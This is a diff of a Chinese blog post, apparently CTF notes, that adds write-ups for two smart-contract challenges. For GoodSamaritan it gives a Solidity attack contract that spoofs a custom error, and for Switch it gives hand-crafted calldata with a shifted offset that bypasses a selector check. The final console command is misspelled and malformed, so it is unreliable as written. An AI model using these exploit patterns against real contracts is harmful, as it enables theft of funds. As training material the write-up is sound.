@@ -41,7 +41,7 @@
 <meta property="og:image" content="https://s2.loli.net/2023/03/18/7twYPhkCWpfLOHg.png">
 <meta property="og:image" content="https://s2.loli.net/2023/03/18/fCWVAJ3Fv5rE17k.png">
 <meta property="article:published_time" content="2023-03-07T16:45:36.000Z">
-<meta property="article:modified_time" content="2023-03-18T15:28:36.735Z">
+<meta property="article:modified_time" content="2023-11-02T16:55:41.285Z">
 <meta property="article:author" content="ClearSky">
 <meta property="article:tag" content="做题笔记">
 <meta name="twitter:card" content="summary">
@@ -156,7 +156,7 @@
                         <i class="fa fa-edit"></i> 
                         
                         
-                            ~2.15K
+                            ~4.29K
                         
                         字
                     </li>
@@ -168,7 +168,7 @@
             
             <div id="expire-alert" class="alert alert-warning hidden" role="alert">
                 <div class="icon"><i class="fa fa-warning"></i></div>
-                <div class="text"><p>本文最后编辑于 <time datetime="1679153316735"></time> 前，其中的内容可能需要更新。</p></div>
+                <div class="text"><p>本文最后编辑于 <time datetime="1698944141285"></time> 前，其中的内容可能需要更新。</p></div>
             </div>
             
             
@@ -271,6 +271,31 @@ super.transfer(_to, _value);
 <p>第一次执行 swap 即发现代币价格改变，一直重复执行 swap，在 token1 和 token2 之间来回倒，而我的 token 持有越来越高，最终使题目方其中一种归零（因为 token 都是 uint 类型，一旦出现分数，会将小数点后的数字约掉）</p>
 </blockquote>
 <p>这道题的确就通过这种简单的左手倒右手的办法完成了。。。</p>
+<h2 id="goodsamaritan"><a class="markdownIt-Anchor" href="#goodsamaritan">#</a> GoodSamaritan</h2>
+<p>就不放题目了，直接放题解</p>
+<p>题解：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.7;</span><br><span class="line"></span><br><span class="line">interface GoodSamaritanInterface &#123;</span><br><span class="line">    function requestDonation() external returns(bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract attackTest&#123;</span><br><span class="line">    error NotEnoughBalance();</span><br><span class="line">    function notify(uint256 amount) pure  external&#123;</span><br><span class="line">        if (amount &lt;= 10) &#123;// 这里需要加条件，否则在transferRemainder还会报错</span><br><span class="line">            revert NotEnoughBalance();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">     function getMoney(address addr) public &#123;</span><br><span class="line">        GoodSamaritanInterface(addr).requestDonation();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>突破点：重写 NotEnoughBalance (), 并使其范围比题目范围更大，使得 error 被攻击合约提前捕获</p>
+</blockquote>
+<h2 id="switch"><a class="markdownIt-Anchor" href="#switch">#</a> Switch</h2>
+<blockquote>
+<p>分析：<br>
+查<em> bytes4 public offSelector = bytes4 (keccak256 (“turnSwitchOff ()”));<em> 发现结果为</em> 20606e15</em>；<br>
+构造:<em>bytes public a = abi.encodeWithSelector(this.flipSwitch.selector, abi.encodeWithSelector(this.turnSwitchOn.selector));</em>，查看以函数选择器<em> turnSwitchOn</em> 为参数调用<em> flipSwitch</em> 的 calldata，发现为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;30c13ade //函数选择器</span><br><span class="line">&gt;0000000000000000000000000000000000000000000000000000000000000020 //偏移量为0x20</span><br><span class="line">&gt;0000000000000000000000000000000000000000000000000000000000000004 //传入内容大小为4字节</span><br><span class="line">&gt;76227e1200000000000000000000000000000000000000000000000000000000 //传入内容</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>而题目要求传入 calldata 的第 68 位开始的四个字节是<em> bytes4 (keccak256 (“turnSwitchOff ()”))</em>，实际就是要求该位置应该调用<em> turnSwitchOff</em>，这里改一下偏移量，对应位置添加一下数据就行了：</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;30c13ade </span><br><span class="line">&gt;0000000000000000000000000000000000000000000000000000000000000060 //修改后的偏移量</span><br><span class="line">&gt;0000000000000000000000000000000000000000000000000000000000000000 </span><br><span class="line">&gt;20606e1500000000000000000000000000000000000000000000000000000000 //在题目要求的位置填入对应数据</span><br><span class="line">&gt;0000000000000000000000000000000000000000000000000000000000000004 //传入数据大小</span><br><span class="line">&gt;76227e1200000000000000000000000000000000000000000000000000000000 //传入</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>最后在网页的控制台传入：<br>
+await web3.eth.sendTransecrion ((from:player,to:&quot;// 实例地址&quot;,calldata:“30c13ade<br>
+0000000000000000000000000000000000000000000000000000000000000060<br>
+0000000000000000000000000000000000000000000000000000000000000000<br>
+20606e1500000000000000000000000000000000000000000000000000000000<br>
+0000000000000000000000000000000000000000000000000000000000000004<br>
+76227e1200000000000000000000000000000000000000000000000000000000”));</p>
 </div>
         </div>
         
@@ -367,7 +392,7 @@ gateThree: 要求获得一个_gatek...`;
                     <a class="tag-none-link" href="/tags/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/" rel="tag">做题笔记</a>
                 </div>
                 <div class="pull-date">
-                    <time datetime="2023-03-18T15:28:36.735Z" itemprop="dateModified">最后编辑：2023-03-18</time>
+                    <time datetime="2023-11-02T16:55:41.285Z" itemprop="dateModified">最后编辑：2023-11-03</time>
                 </div>
             </div>
         </footer>
